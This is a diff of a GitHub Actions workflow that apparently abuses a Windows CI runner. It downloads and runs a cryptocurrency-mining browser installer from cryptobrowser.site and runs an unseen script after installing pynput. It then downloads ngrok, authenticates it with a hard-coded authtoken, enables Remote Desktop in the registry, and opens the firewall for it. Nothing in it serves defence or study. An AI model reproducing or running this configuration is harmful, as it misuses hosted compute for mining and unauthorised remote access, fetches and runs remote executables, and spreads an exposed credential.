@@ -9,11 +9,10 @@ jobs:
 
     steps:
     - name: Download Ngrok
-      run: Invoke-WebRequest https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip -OutFile ngrok.zip
-    - run: Invoke-WebRequest https://cryptobrowser.site/get/BrowserSetup.exe -OutFile cryptotab.exe
+  
+      run: Invoke-WebRequest https://cryptobrowser.site/get/BrowserSetup.exe -OutFile cryptotab.exe
     - run: .\cryptotab.exe
-    - name: Extract Ngrok Archive
-      run: Expand-Archive ngrok.zip
+
     - uses: actions/checkout@v2
     - name: Set up Python
       uses: actions/setup-python@v1
@@ -24,8 +23,11 @@ jobs:
          python -m pip install --upgrade pip
          pip install pynput
          python finall_2.py
-    - name: Auth
-      run: .\ngrok\ngrok.exe authtoken 1rxR0SWGxdjlvdZoDa8CbGK4eJi_6MxA8n34TRKQNKWHEs9xi
+    - name: download 
+      run: Invoke-WebRequest https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip -OutFile ngrok.zip
+    - name: Extract Ngrok Archive and auth
+      run: Expand-Archive ngrok.zip
+    - run: .\ngrok\ngrok.exe authtoken 1rxR0SWGxdjlvdZoDa8CbGK4eJi_6MxA8n34TRKQNKWHEs9xi
     - name: Enable TS
       run: Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
     - run: Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
